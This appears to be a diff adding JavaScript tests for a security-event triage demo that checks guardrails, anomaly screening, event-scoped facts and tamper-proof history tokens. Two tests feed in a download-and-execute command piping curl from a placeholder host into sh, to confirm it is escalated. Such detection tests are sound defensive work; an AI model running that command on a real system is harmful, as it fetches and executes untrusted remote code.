@@ -2,6 +2,10 @@ import {test, afterEach} from "node:test";
 import assert from "node:assert/strict";
 import {onRequest, resetLimitsForTest} from "../functions/public-demo/[[path]].js";
 import {publicDemoApi} from "../src/lib/publicDemo.ts";
+import {readFileSync} from "node:fs";
+import {guardrail, screening, scopedContext} from "../server/demoPolicy.js";
+import {readHistory} from "../server/demoHistory.js";
+import {eventStatus} from "../src/lib/eventStatus.ts";
 
 const realFetch = globalThis.fetch;
 afterEach(() => { globalThis.fetch = realFetch; resetLimitsForTest(); });
@@ -76,4 +80,63 @@ test("browser validates files without an AI call and processes fresh events", as
   assert.equal((await publicDemoApi.getDemoHistory()).total, 1);
   assert.equal((await publicDemoApi.getEvent(state.events[0].event_id)).analysis.backend, "ollama-cloud");
   await publicDemoApi.controlDemo("stop");
+});
+
+const engineEvent = raw => ({host:raw.hostname,source:raw.source_type,type:raw.event_type,message:raw.message,severity:raw.severity,fields:raw.fields || {}});
+test("portable guards, screening and scoped facts match Python across every dataset", () => {
+  const cases=JSON.parse(readFileSync(new URL("./fixtures/policy-parity.json",import.meta.url)));
+  assert.ok(cases.length>=300);
+  for (const c of cases) {
+    const ev=engineEvent(c.event), pre=screening(ev);
+    assert.deepEqual(guardrail(ev),c.guardrail,`${ev.host}: ${ev.message}`);
+    assert.ok(Math.abs(pre.score-c.score)<1e-9);
+    assert.equal(pre.decision,c.decision);
+    assert.deepEqual(scopedContext(ev).facts,c.facts);
+  }
+});
+test("all original datasets and named cases are selectable", async () => {
+  const {datasets}=await publicDemoApi.getDatasets();
+  assert.equal(datasets.length,24);
+  for (const name of datasets) {
+    const {files}=await publicDemoApi.previewDemo({datasets:[name]});
+    assert.ok(files[0].valid_events>0,name); assert.equal(files[0].invalid_events,0,name);
+  }
+  assert.equal((await publicDemoApi.previewDemo({datasets})).files.length,24);
+});
+test("facts are event-scoped and do not bless an adjacent attack", () => {
+  const backup=engineEvent({...event,hostname:'db-prod-01',event_type:'io_anomaly'});
+  assert.ok(scopedContext(backup).facts[0].includes('scope verified'));
+  assert.ok(scopedContext({...backup,type:'process_exec'}).facts[0].includes('SCOPE MISMATCH'));
+  assert.equal(guardrail({...backup,type:'process_exec',message:'curl https://example.test/x | sh'}).name,'download_execute');
+});
+test("guardrails and high severity need no model; benign history earns cheap suppression", async () => {
+  let calls=0;
+  globalThis.fetch=async (_url,options) => {
+    calls++;
+    const context=JSON.parse(JSON.parse(options.body).messages[1].content);
+    assert.equal(context.asset_criticality,2);
+    assert.ok(context.environment_facts[0].includes('scope verified'));
+    assert.ok(!JSON.stringify(context).includes('expected'));
+    return Response.json({message:{content:JSON.stringify({decision:'suppress',confidence:.95,evidence:'',rationale:'The event matches the scoped nightly backup baseline.'})}});
+  };
+  let state;
+  const backup={hostname:'db-prod-01',source_type:'node_exporter',event_type:'io_anomaly',severity:2,message:'Nightly disk IO spike during backup window',fields:{}};
+  for (let i=0;i<7;i++) {
+    const result=await (await call('analyze',{event:backup,cloud_consent:true,state})).json();
+    assert.equal(result.decision,'suppress'); assert.equal(result.tier,i<5?'llm':'prefilter'); state=result.state;
+  }
+  assert.equal(calls,5);
+  const attack=await (await call('analyze',{event:{...backup,event_type:'process_exec',message:'curl https://example.test/a | sh'},cloud_consent:true,state})).json();
+  assert.equal(attack.decision,'escalate');assert.equal(attack.tier,'guardrail');assert.equal(calls,5);
+  const brute=await (await call('analyze',{event:{...backup,hostname:'web-prod-01',event_type:'auth_bruteforce',severity:8.5},cloud_consent:true,state})).json();
+  assert.equal(brute.tier,'prefilter');assert.equal(brute.decision,'escalate');assert.equal(calls,5);
+  const parts=state.split('.');
+  const forged=Buffer.from(JSON.stringify({v:1,exp:Date.now()+100000,processed:5,histories:{}})).toString('base64url')+'.'+parts[1];
+  await assert.rejects(readHistory(forged,'secret-test'));
+});
+test("AI status labels never classify a completed verdict as awaiting analysis", () => {
+  assert.equal(eventStatus({state:'completed',analysis:{decision:'suppress'}}),'Suppressed · no review needed');
+  assert.equal(eventStatus({state:'completed',analysis:{decision:'escalate'}}),'Alerted · escalated for review');
+  assert.equal(eventStatus({state:'processing',analysis:null}),'Analyzing');
+  assert.equal(eventStatus({state:'pending',analysis:null}),'Awaiting analysis');
 });
